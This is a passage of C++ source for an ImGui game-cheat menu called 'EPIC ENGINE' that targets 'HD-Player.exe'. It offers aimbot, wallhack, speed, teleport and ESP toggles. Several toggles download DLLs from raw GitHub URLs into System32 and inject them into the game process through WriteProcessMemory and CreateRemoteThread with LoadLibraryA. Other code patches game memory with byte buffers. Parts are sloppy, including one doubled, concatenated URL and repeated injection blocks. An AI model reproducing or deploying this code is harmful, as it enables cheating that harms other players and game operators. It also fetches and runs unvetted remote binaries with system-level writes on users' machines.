            if (authenticed == true)
            {


                //ImGui::GetBackgroundDrawList()->AddImage(image::bg, ImVec2(0, 0), ImVec2(1920, 1080), ImVec2(0, 0), ImVec2(1, 1), ImColor(255, 255, 255, 255));

                ImGui::SetNextWindowPos(ImVec2(0, 0));
                ImGui::SetNextWindowSize(ImVec2(c::bg::size) + ImVec2(tab_size, 0));
                ImGui::Begin("EPIC ENGINE", nullptr, ImGuiWindowFlags_NoDecoration | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoBringToFrontOnFocus);
                {
                    Trinage_background();

                    const ImVec2& pos = ImGui::GetWindowPos();
                    const auto& p = ImGui::GetWindowPos();
                    const ImVec2 spacing = ImGui::GetStyle().ItemSpacing;

                    ImGui::GetBackgroundDrawList()->AddRectFilled(pos, pos + ImVec2(c::bg::size) + ImVec2(tab_size, 0), ImGui::GetColorU32(c::bg::background), c::bg::rounding);
                    ImGui::GetBackgroundDrawList()->AddRect(pos, pos + ImVec2(c::bg::size) + ImVec2(tab_size, 0), ImGui::GetColorU32(c::bg::outline_background), c::bg::rounding);

                    //const int vtx_idx_1 = ImGui::GetWindowDrawList()->VtxBuffer.Size;
                    //ImGui::GetWindowDrawList()->AddRect(ImVec2(1, 1), ImVec2(c::bg::size) + ImVec2(tab_size, 0), ImGui::GetColorU32(c::bg::background), c::bg::rounding, ImDrawFlags_None, 2.f);
                    //ImGui::ShadeVertsLinearColorGradientKeepAlpha(ImGui::GetWindowDrawList(), vtx_idx_1, ImGui::GetWindowDrawList()->VtxBuffer.Size, ImVec2(1, 1), ImVec2(c::bg::size) + ImVec2(tab_size, 0), ImGui::GetColorU32(c::general_color), ImColor(14, 14, 15, 255));

                    ImGui::GetBackgroundDrawList()->AddRect(p + ImVec2(1, 1), p + ImVec2(c::bg::size) + ImVec2(tab_size, 0), ImGui::GetColorU32(c::accent_color), c::bg::rounding, ImDrawCornerFlags_All, 2.0f);

                    ImGui::PushStyleColor(ImGuiCol_Text, ImGui::GetColorU32(c::accent_color));

                    ImGui::PushFont(font::tahoma_bold2); ImGui::RenderTextClipped(pos + ImVec2(55, 0) + spacing, pos + spacing + ImVec2(55, 60) + ImVec2(tab_size + (spacing.x / 2) - 30, 0), "EPIC ENGINE", NULL, NULL, ImVec2(0.5f, 0.5f), NULL); ImGui::PopFont();

                    std::string user = KeyAuthApp.data.username;

                    ImGui::RenderTextClipped(pos + ImVec2(60 + spacing.x, c::bg::size.y - 60 * 2), pos + spacing + ImVec2(60, c::bg::size.y) + ImVec2(tab_size, 0), user.c_str(), NULL, NULL, ImVec2(0.0f, 0.43f), NULL);

                    std::string expiry = KeyAuthApp.data.expiry;
                    std::time_t expiryTime = std::atoi(expiry.c_str());
                    std::tm* tmPtr = std::localtime(&expiryTime);
                    char formattedExpiry[20];
                    std::strftime(formattedExpiry, sizeof(formattedExpiry), "%d/%m/%Y", tmPtr);
                    ImGui::RenderTextClipped(pos + ImVec2(60 + spacing.x, c::bg::size.y - 60 * 2), pos + spacing + ImVec2(60, c::bg::size.y) + ImVec2(tab_size, 0), formattedExpiry, NULL, NULL, ImVec2(0.0f, 0.57f), NULL);

                    ImGui::PushFont(font::tahoma_bold2); ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(250, 255, 255, 255)); ImGui::RenderTextClipped(pos + ImVec2(tab_size + 85, 0) + spacing, pos + spacing + ImVec2(30, 40) + ImVec2(tab_size + (spacing.x / 2) + 299, 0), ("Hello, " + user).c_str(), NULL, NULL); ImGui::PopFont(); ImGui::PopStyleColor();                    // ImGui::GetBackgroundDrawList()->AddImage(image::logo, pos+ImVec2(10,10), pos + ImVec2(10,10),ImVec2(100,100),ImVec2(100,100),ImColor(255,255,255,255));


                    ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(90, 93, 100, 255)); ImGui::RenderTextClipped(pos + ImVec2(tab_size + 85, 30) + spacing, pos + spacing + ImVec2(60, 80) + ImVec2(tab_size + (spacing.x / 2) + 150, -20), "Welcome Back!", NULL, NULL); ImGui::PopStyleColor();

                    ImGui::SetCursorPos(ImVec2(245 + tab_size, -20) + (s->ItemSpacing * 2));
                    ImGui::BeginChild("", "", ImVec2((0, 0), 0));
                    ImGui::PushFont(font::tab_icon);
                    //ImGui::Text("I"); ImGui::SameLine();
                    //ImGui::Text("H"); ImGui::SameLine();
                    //ImGui::Text("G"); ImGui::SameLine();

                    //ImGui::GetWindowDrawList()->AddText(pos + ImVec2(460, 38), ImColor(90, 93, 100, 255), "I");
                    //ImGui::GetWindowDrawList()->AddText(pos + ImVec2(495, 38), ImColor(90, 93, 100, 255), "H");
                    //ImGui::GetWindowDrawList()->AddText(pos + ImVec2(530, 38), ImColor(90, 93, 100, 255), "G");
                    ImGui::PopFont();
                    ImGui::EndChild();


                    ImGui::SetCursorPos(ImVec2(385 + tab_size, -20) + (s->ItemSpacing * 2));
                    ImGui::BeginChild("", "  ", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 60));
                    ImGui::PushFont(font::poppins_medium);

                    //ImGui::TextColored(ImColor(1.0f, 1.0f, 1.0f, 1.f), "Status: ");
                    ImGui::CalcTextSize(messger.c_str()); 
                    ImGui::TextColored(c::accent_color, (messger.c_str()));

                    ImGui::PopFont();
                    ImGui::EndChild();
                    ImGui::PopStyleColor(1);

                    const char* nametab_array1[2] = { "E","C" };
                    const char* nametab_array[2] = { "AimHacks Menu","Settings & Colors" };
                    const char* nametab_hint_array[2] = { "Aimbot & Sniper","Settings & Colors" };


                    static int tabs = 0;

                    ImGui::SetCursorPos(ImVec2(spacing.x + (60 - 22) / 2, 60 + (spacing.y * 2) + 22));
                    ImGui::BeginGroup();
                    {
                        for (int i = 0; i < sizeof(nametab_array1) / sizeof(nametab_array1[0]); i++)
                            if (ImGui::Tab(i == tabs, nametab_array1[i], nametab_array[i], nametab_hint_array[i], ImVec2(35 + tab_size, 35))) tabs = i;
                    }
                    ImGui::EndGroup();

                    ImGui::SetCursorPos(ImVec2(10, 10) + spacing);

                    ImRotateStart();
                    if (ImGui::CustomButton(1, image::logo, ImVec2(40, 40), ImVec2(0, 0), ImVec2(1, 1), ImGui::GetColorU32(c::accent_color)))
                        tab_opening = !tab_opening;
                    //ImRotateEnd(1.57f * arrow_roll);


                    ImGui::GetBackgroundDrawList()->AddRectFilled(pos + ImVec2(0, -20 + spacing.y) + spacing, pos + spacing + ImVec2(60, c::bg::size.y - 60 - spacing.y * 3) + ImVec2(tab_size, 0), ImGui::GetColorU32(c::child::background), c::child::rounding);
                    ImGui::GetBackgroundDrawList()->AddRect(pos + ImVec2(0, -20 + spacing.y) + spacing, pos + spacing + ImVec2(60, c::bg::size.y - 60 - spacing.y * 3) + ImVec2(tab_size, 0), ImGui::GetColorU32(c::child::outline_background), c::child::rounding);

                    ImGui::GetBackgroundDrawList()->AddRectFilled(pos + ImVec2(0, c::bg::size.y - 60 - spacing.y * 2) + spacing, pos + spacing + ImVec2(60, c::bg::size.y - spacing.y * 2) + ImVec2(tab_size, 0), ImGui::GetColorU32(c::child::background), c::child::rounding);
                    ImGui::GetBackgroundDrawList()->AddRect(pos + ImVec2(0, c::bg::size.y - 60 - spacing.y * 2) + spacing, pos + spacing + ImVec2(60, c::bg::size.y - spacing.y * 2) + ImVec2(tab_size, 0), ImGui::GetColorU32(c::child::outline_background), c::child::rounding);

                    ImGui::SetCursorPos(ImVec2(28, 568));
                    if (ImGui::CustomButton(1, image::logo, ImVec2(40, 40), ImVec2(0, 0), ImVec2(1, 1), ImGui::GetColorU32(c::accent_color)))
                    ImGui::GetWindowDrawList()->AddImage(image::logo, pos + ImVec2(40, c::bg::size.y - 30 - spacing.y * 2) + spacing + ImVec2(-30, -30), pos + spacing + ImVec2(60, c::bg::size.y - spacing.y * 2) - ImVec2(0, 0), ImVec2(0, 0), ImVec2(1, 1), ImColor(255, 255, 255, 255));

                    //ImGui::GetWindowDrawList()->AddCircleFilled(pos + ImVec2(63, c::bg::size.y - (spacing.y * 2) + 3), 10.f, ImGui::GetColorU32(c::child::background), 100.f);
                    //ImGui::GetWindowDrawList()->AddCircleFilled(pos + ImVec2(63, c::bg::size.y - (spacing.y * 2) + 3), 6.f, ImColor(0, 255, 0, 255), 100.f);




                    static float tab_alpha = 0.f; /* */ static float tab_add; /* */ static int active_tab = 0;

                    tab_alpha = ImClamp(tab_alpha + (4.f * ImGui::GetIO().DeltaTime * (tabs == active_tab ? 1.f : -1.f)), 0.f, 1.f);
                    tab_add = ImClamp(tab_add + (std::round(350.f) * ImGui::GetIO().DeltaTime * (tabs == active_tab ? 1.f : -1.f)), 0.f, 1.f);

                    if (tab_alpha == 0.f && tab_add == 0.f) active_tab = tabs;

                    ImGui::PushStyleVar(ImGuiStyleVar_Alpha, tab_alpha * s->Alpha);



       
                    //////
                    if (tabs == 0)
                    {


                        ImGui::SetCursorPos(ImVec2(60 + tab_size, 60) + (s->ItemSpacing * 2));
                        ImGui::BeginGroup();
                        {
                            ImGui::BeginChild("D", "Aim Menu", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 190));
                            {
                                Trinage_background();

                                if (ImGui::Checkbox("Aimbot External [Head]", &_aimbotexterno))
                                {
                                    if (_aimbotexterno == 1)
                                    {

                                        std::thread(aimbotexterno).detach();
                                        // dino.EnableAimHead();
                                    }

                                }

                                if (ImGui::Checkbox("Aimbot External [Drag]", &_aimbotdrag))
                                {
                                    if (_aimbotdrag == 1)
                                    {

                                        std::thread(aimbotdrag).detach();
                                        // dino.EnableAimHead();
                                    }

                                }
                                if (ImGui::Checkbox("Aimbot External [Body]", &_aimbotbody))
                                {
                                    if (_aimbotbody == 1)
                                    {

                                        std::thread(aimbotbody).detach();
                                        // dino.EnableAimHead();
                                    }

                                }

                                if (ImGui::Checkbox("Aimbot External [Scope]", &_aimbotscope))
                                {
                                    if (_aimbotscope == 1)
                                    {

                                        std::thread(aimbotscope).detach();
                                        // dino.EnableAimHead();
                                    }

                                }

                                if (ImGui::Checkbox("Speed Hack", &_tracking))
                                {
                                    if (_tracking == 1)
                                    {

                                        std::thread(tracking).detach();
                                        // dino.EnableAimHead();
                                    }

                                }
                            }
                            ImGui::EndChild();
                            ImGui::SetCursorPos(ImVec2(60 + tab_size, 270) + (s->ItemSpacing * 2));
                            ImGui::BeginChild("C", "Visuals Menu", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 280));
                            {
                                Trinage_background();
                            
                                if (ImGui::Checkbox("Chams Menu", &checkbox1[1]))
                                {
                                    if (mirza.AttackProcess("HD-Player.exe")) {

                                        SYSTEM_INFO si;
                                        GetSystemInfo(&si);

                                        DWORD_PTR SAddress = (DWORD_PTR)si.lpMinimumApplicationAddress;
                                        DWORD_PTR EAddress = (DWORD_PTR)si.lpMaximumApplicationAddress;



                                        std::string url = "https://raw.githubusercontent.com/Anesss17/DLL1/main/ziit.dll";


                                        // Local file path to save the downloaded file
                                        std::string localFilePath = "C:\\Windows\\System32\\ziit.dll";

                                        // Download the file
                                        // Download the file
                                        HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), localFilePath.c_str(), 0, NULL);
                                        if (SUCCEEDED(hr)) {
                                            std::cout << "File downloaded successfully.\n";
                                        }
                                        else {
                                            std::cerr << "Failed to download file. Error code: " << hr << std::endl;
                                        }



                                        LPCSTR DllPath = "C:\\Windows\\System32\\ziit.dll";
                                        DWORD procID = GetPid("HD-Player.exe");
                                        HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
                                        LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
                                        WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

                                        HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
                                            (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
                                        WaitForSingleObject(hLoadThread, INFINITE);

                                        VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

                                        Beep(800, 400);


                                    };

                                }
                                if (ImGui::Checkbox("Chams Red", &_hombrosxd))
                                {
                                    std::string url = "https://raw.githubusercontent.com/yassine3245646546/red/main/ChamsRed.dll";


                                    // Local file path to save the downloaded file
                                    std::string localFilePath = "C:\\Windows\\System32\\ChamsRed.dll";

                                    // Download the file
                                    // Download the file
                                    HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), localFilePath.c_str(), 0, NULL);
                                    if (SUCCEEDED(hr)) {
                                        std::cout << "File downloaded successfully.\n";
                                    }
                                    else {
                                        std::cerr << "Failed to download file. Error code: " << hr << std::endl;
                                    }

                                    if (mirza.AttackProcess("HD-Player.exe")) {

                                        LPCSTR DllPath = "C:\\Windows\\System32\\ChamsRed.dll";
                                        DWORD procID = GetPid("HD-Player.exe");
                                        HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
                                        LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
                                        WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

                                        HANDLE hLoadThrea = CreateRemoteThread(handle, 0, 0,
                                            (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
                                        WaitForSingleObject(hLoadThrea, INFINITE);

                                        VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

                                        std::string ur = "https://raw.githubusercontent.com/yassine3245646546/red/main/ChamsRed.dllhttps://raw.githubusercontent.com/yassine3245646546/red/main/ChamsRed.dll";


                                        // Local file path to save the downloaded file
                                        std::string localFilePat = "C:\\Windows\\System32\\ChamsRed.dll";

                                        // Download the file
                                        // Download the file
                                        HRESULT lk = URLDownloadToFileA(NULL, ur.c_str(), localFilePat.c_str(), 0, NULL);
                                        if (SUCCEEDED(lk)) {
                                            std::cout << "File downloaded successfully.\n";
                                        }
                                        else {
                                            std::cerr << "Failed to download file. Error code: " << lk << std::endl;
                                        }



                                        LPCSTR DllPat = "C:\\Windows\\System32\\ChamsRed.dll";
                                        DWORD procI = GetPid("HD-Player.exe");
                                        HANDLE handl = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procI);
                                        LPVOID pDllPat = VirtualAllocEx(handl, 0, strlen(DllPat) + 1, MEM_COMMIT, PAGE_READWRITE);
                                        WriteProcessMemory(handl, pDllPat, (LPVOID)DllPat, strlen(DllPat) + 1, 0);

                                        HANDLE hoadThrea = CreateRemoteThread(handl, 0, 0,
                                            (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPat, 0, 0);
                                        WaitForSingleObject(hoadThrea, INFINITE);

                                        VirtualFreeEx(handl, pDllPat, strlen(DllPat) + 1, MEM_RELEASE);

                                        Beep(800, 400);

                                    };

                                }

                                if (ImGui::Checkbox("Chams Blue", &checkbox2[2]))
                                {
                                    SYSTEM_INFO si;
                                    GetSystemInfo(&si);

                                    DWORD_PTR SAddress = (DWORD_PTR)si.lpMinimumApplicationAddress;
                                    DWORD_PTR EAddress = (DWORD_PTR)si.lpMaximumApplicationAddress;



                                    std::string url = "https://raw.githubusercontent.com/yassine3245646546/red/main/FX_COLOR%20(1).dll";


                                    // Local file path to save the downloaded file
                                    std::string localFilePath = "C:\\Windows\\System32\\FX_COLOR%20(1).dll";

                                    // Download the file
                                    // Download the file
                                    HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), localFilePath.c_str(), 0, NULL);
                                    if (SUCCEEDED(hr)) {
                                        std::cout << "File downloaded successfully.\n";
                                    }
                                    else {
                                        std::cerr << "Failed to download file. Error code: " << hr << std::endl;
                                    }


                                    if (mirza.AttackProcess("HD-Player.exe")) {

                                        LPCSTR DllPath = "C:\\Windows\\System32\\FX_COLOR%20(1).dll";
                                        DWORD procID = GetPid("HD-Player.exe");
                                        HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
                                        LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
                                        WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

                                        HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
                                            (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
                                        WaitForSingleObject(hLoadThread, INFINITE);

                                        VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

                                        Beep(800, 400);
                                    }

                                }

                                if (ImGui::Checkbox("Esp Box", &checkbox3[3]))
                                {
                                    if (mirza.AttackProcess("HD-Player.exe")) {

                                        SYSTEM_INFO si;
                                        GetSystemInfo(&si);

                                        DWORD_PTR SAddress = (DWORD_PTR)si.lpMinimumApplicationAddress;
                                        DWORD_PTR EAddress = (DWORD_PTR)si.lpMaximumApplicationAddress;



                                        std::string url = "https://raw.githubusercontent.com/yassine3245646546/red/main/FX_BLUE_BOX.dll";


                                        // Local file path to save the downloaded file
                                        std::string localFilePath = "C:\\Windows\\System32\\FX_BLUE_BOX.dll";

                                        // Download the file
                                        // Download the file
                                        HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), localFilePath.c_str(), 0, NULL);
                                        if (SUCCEEDED(hr)) {
                                            std::cout << "File downloaded successfully.\n";
                                        }
                                        else {
                                            std::cerr << "Failed to download file. Error code: " << hr << std::endl;
                                        }



                                        LPCSTR DllPath = "C:\\Windows\\System32\\FX_BLUE_BOX.dll";
                                        DWORD procID = GetPid("HD-Player.exe");
                                        HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
                                        LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
                                        WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

                                        HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
                                            (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
                                        WaitForSingleObject(hLoadThread, INFINITE);

                                        VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

                                        Beep(800, 400);

                                    };

                                }

                                if (ImGui::Checkbox("Chams 3D", &checkbox4[4]))
                                {
                                    if (mirza.AttackProcess("HD-Player.exe")) {

                                        std::string url = "https://raw.githubusercontent.com/Anesss17/DLL/main/Shield.dll";


                                        // Local file path to save the downloaded file
                                        std::string localFilePath = "C:\\Windows\\System32\\Shield.dll";

                                        // Download the file
                                        // Download the file
                                        HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), localFilePath.c_str(), 0, NULL);
                                        if (SUCCEEDED(hr)) {
                                            std::cout << "File downloaded successfully.\n";
                                        }
                                        else {
                                            std::cerr << "Failed to download file. Error code: " << hr << std::endl;
                                        }



                                        LPCSTR DllPath = "C:\\Windows\\System32\\Shield.dll";
                                        DWORD procID = GetPid("HD-Player.exe");
                                        HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
                                        LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
                                        WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

                                        HANDLE hLoadThrea = CreateRemoteThread(handle, 0, 0,
                                            (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
                                        WaitForSingleObject(hLoadThrea, INFINITE);

                                        VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

                                        std::string ur = "https://raw.githubusercontent.com/Anesss17/DLL/main/Shield.dll";


                                        // Local file path to save the downloaded file
                                        std::string localFilePat = "C:\\Windows\\System32\\Shield.dll";

                                        // Download the file
                                        // Download the file
                                        HRESULT lk = URLDownloadToFileA(NULL, ur.c_str(), localFilePat.c_str(), 0, NULL);
                                        if (SUCCEEDED(lk)) {
                                            std::cout << "File downloaded successfully.\n";
                                        }
                                        else {
                                            std::cerr << "Failed to download file. Error code: " << lk << std::endl;
                                        }



                                        LPCSTR DllPat = "C:\\Windows\\System32\\Shield.dll";
                                        DWORD procI = GetPid("HD-Player.exe");
                                        HANDLE handl = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procI);
                                        LPVOID pDllPat = VirtualAllocEx(handl, 0, strlen(DllPat) + 1, MEM_COMMIT, PAGE_READWRITE);
                                        WriteProcessMemory(handl, pDllPat, (LPVOID)DllPat, strlen(DllPat) + 1, 0);

                                        HANDLE hoadThrea = CreateRemoteThread(handl, 0, 0,
                                            (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPat, 0, 0);
                                        WaitForSingleObject(hoadThrea, INFINITE);

                                        VirtualFreeEx(handl, pDllPat, strlen(DllPat) + 1, MEM_RELEASE);

                                        Beep(800, 400);

                                    };

                                }

                                if (ImGui::Checkbox("Esp RGP", &checkbox5[5]))
                                {
                                    if (mirza.AttackProcess("HD-Player.exe")) {

                                        std::string url = "https://raw.githubusercontent.com/yassine3245646546/red/main/boxrgb.dll";


                                        // Local file path to save the downloaded file
                                        std::string localFilePath = "C:\\Windows\\System32\\boxrgb.dll";

                                        // Download the file
                                        // Download the file
                                        HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), localFilePath.c_str(), 0, NULL);
                                        if (SUCCEEDED(hr)) {
                                            std::cout << "File downloaded successfully.\n";
                                        }
                                        else {
                                            std::cerr << "Failed to download file. Error code: " << hr << std::endl;
                                        }



                                        LPCSTR DllPath = "C:\\Windows\\System32\\boxrgb.dll";
                                        DWORD procID = GetPid("HD-Player.exe");
                                        HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
                                        LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
                                        WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

                                        HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0,
                                            (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
                                        WaitForSingleObject(hLoadThread, INFINITE);

                                        VirtualFreeEx(handle, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

                                        Beep(800, 400);

                                    };

                                }

                                


                               

                            }
                            ImGui::EndChild();

                            
                           
                        }
                        ImGui::EndGroup();
                        ImGui::SameLine();

                        ImGui::BeginGroup();
                        {
                            ImGui::BeginChild("C", "Sniper Menu", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 190));
                            {
                                Trinage_background();
                                
                             /*   
                                if (ImGui::Checkbox("Sniper Scope Awm", &_triplefast22))

                                {
                                    if (_triplefast22 == 1)
                                    {

                                        std::thread(triplefast22).detach();
                                    }
                                }*/

                                if (ImGui::Checkbox("No Scope Awm", &_noscope))

                                {
                                    if (_noscope == 1)
                                    {

                                        std::thread(noscope).detach();
                                    }
                                }


                                if (ImGui::Checkbox("Switch Awm V2", &_switchawm))

                                {
                                    if (_switchawm == 1)
                                    {

                                        std::thread(switchawm).detach();
                                    }
                                }

                                if (ImGui::Checkbox("Scope Tracking Awm", &_trackingawm))

                                {
                                    if (_trackingawm == 1)
                                    {

                                        std::thread(trackingawm).detach();
                                    }
                                }
                         
                            
                            
                            }
                            ImGui::EndChild();

                            ImGui::BeginChild("C", "Key Binds", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 150));
                            {

                                Trinage_background();

                                ImGui::Keybind("Aimbot [Head] Keybind", &applyaimbot, &applyaimbot);
                                if (GetAsyncKeyState(applyaimbot) & 1)
                                {
                                    std::thread(aimbotexterno).detach();
                                }
                                
                                ImGui::Keybind("Aimbot [Drag] Keybind", &applydrag, &applydrag);
                                if (GetAsyncKeyState(applydrag) & 1)
                                {
                                    std::thread(aimbotdrag).detach();
                                }

                                ImGui::Keybind("Aimbot [Body] Keybind", &applybody, &applybody);
                                if (GetAsyncKeyState(applybody) & 1)
                                {
                                    std::thread(aimbotbody).detach();
                                }

                               
                                



                            }
                            ImGui::EndChild();


                        }
                        ImGui::EndGroup();
                    }
                    ///////
                    if (tabs == 3)
                    {


                        ImGui::SetCursorPos(ImVec2(60 + tab_size, 60) + (s->ItemSpacing * 2));
                        ImGui::BeginGroup();
                        {
                            ImGui::BeginChild("D", "Menu Balas", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 190));
                            {
                            

                              
                                if (ImGui::Checkbox("BALAS V1 - Lobby", &_balasv2))  //Y ESTE EL BOTON
                                {
                                    if (_balasv2 == 1)
                                    {

                                        std::thread(balasv1).detach();

                                    }

                                }




                                if (ImGui::Checkbox("BALAS V2 - Login", &_balasv3))  //Y ESTE EL BOTON
                                {
                                    if (_balasv3 == 1)
                                    {

                                        std::thread(Balas3).detach();

                                    }


                                }
                            }
                            ImGui::EndChild();
                            ImGui::SetCursorPos(ImVec2(60 + tab_size, 270) + (s->ItemSpacing * 2));
                            ImGui::BeginChild("C", "MENU PESADO 2", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 280));
                            {

                                if (ImGui::Checkbox("Camara Under", &_rafaelmejor))
                                {
                                    if (_rafaelmejor == 1)
                                    {

                                        std::thread(MemoryScanspeendx99).detach();

                                    }

                                }

                            }
                            ImGui::EndChild();

                        }
                        ImGui::EndGroup();
                        ImGui::SameLine();

                        ImGui::BeginGroup();
                        {
                            ImGui::BeginChild("C", "MENU POTENTE", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 190));
                            {


                                
                                if (ImGui::Checkbox("TELEPORT PLAY ", &_hooks))
                                {
                                    if (_hooks == 1)
                                    {

                                        std::thread(MemoryScanTeleportRafaplay).detach();


                                    }

                                }

                                if (ImGui::Checkbox("WALLHACK DURO ", &_wallchafa))
                                {
                                    if (_wallchafa == 1)
                                    {

                                        std::thread(MemoryScanWALLNEW).detach();

                                    }

                                }
                                if (ImGui::Checkbox("SALTO INSANO ", &_tiomods))
                                {
                                    if (_tiomods == 1)
                                    {

                                        std::thread(MemoryScanSalto).detach();

                                    }

                                }










                                if (ImGui::Checkbox("SPEED x99", &_speendx99))
                                {
                                    if (_speendx99 == 1)
                                    {

                                        std::thread(MemoryScanspeendx99).detach();

                                    }

                                }


                          
                            
                            
                            
                            }
                            ImGui::EndChild();


                            ImGui::BeginChild("D", "TECLAS RAPIDAS", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 280));
                            {
                                const char* camrafa[10]{ "N/A", "1", "2", "3","F1", "F2", "F3", "F4", "Q",  "E" };
                                ImGui::Combo("CAMARA UNDER", &camararafa, camrafa, IM_ARRAYSIZE(camrafa), 10);



                                {
                                    if (bottons_dark::as)
                                    {
                                        if (!bottons_darkon::as) {
                                            bottons_darkon::as = true;
                                            bottons_darkon::as2 = true;

                                            // Apagar
                                            statusButtonPressed12 = false;
                                            //   BYTE buffer[] = { 0x00, 0x00, 0x7A, 0xC4 }; teleport code ff amazon

                                            BYTE buffer[] = { 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xBF, 0x00, 0x00, 0x00, 0x00
                                            };


                                            for (int i = 0; i < foundAddresses12.size(); i++) {
                                                WriteProcessMemory(CMemory::Initialize()->processHandle, (void*)foundAddresses12[i], buffer, sizeof(buffer), NULL);
                                            }
                                            messger = "CAMARA UNDER ACTIVADO";


                                            Beep(800, 700);



                                        }
                                        else
                                        {
                                            // Encender





                                        }
                                    }
                                    else {
                                        bottons_darkon::as = false;
                                        if (bottons_darkon::as2) {
                                            bottons_darkon::as2 = false;

                                            statusButtonPressed12 = true;
                                            BYTE buffer[] = { 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xBF, 0x00, 0x00, 0x00, 0x00





                                            };
                                            for (int i = 0; i < foundAddresses12.size(); i++) {
                                                WriteProcessMemory(CMemory::Initialize()->processHandle, (void*)foundAddresses12[i], buffer, sizeof(buffer), NULL);
                                            }

                                            messger = "CAMARA UNDER DESACTIVADO";
                                            Beep(400, 700);


                                            //  std::thread(MemoryScanWall).detach();

                                        }
                                    }

                                }














                                const char* chafa[10]{ "N/A", "1", "2", "3","F1", "F2", "F3", "F4", "Q",  "E" };
                                ImGui::Combo("WALLHACK", &wallchafa, chafa, IM_ARRAYSIZE(chafa), 10);



                                {
                                    if (bottons_dark::cf)
                                    {
                                        if (!bottons_darkon::cf) {
                                            bottons_darkon::cf = true;
                                            bottons_darkon::cf2 = true;

                                            // Apagar
                                            statusButtonPressed15 = false;
                                            //   BYTE buffer[] = { 0x00, 0x00, 0x7A, 0xC4 }; teleport code ff amazon

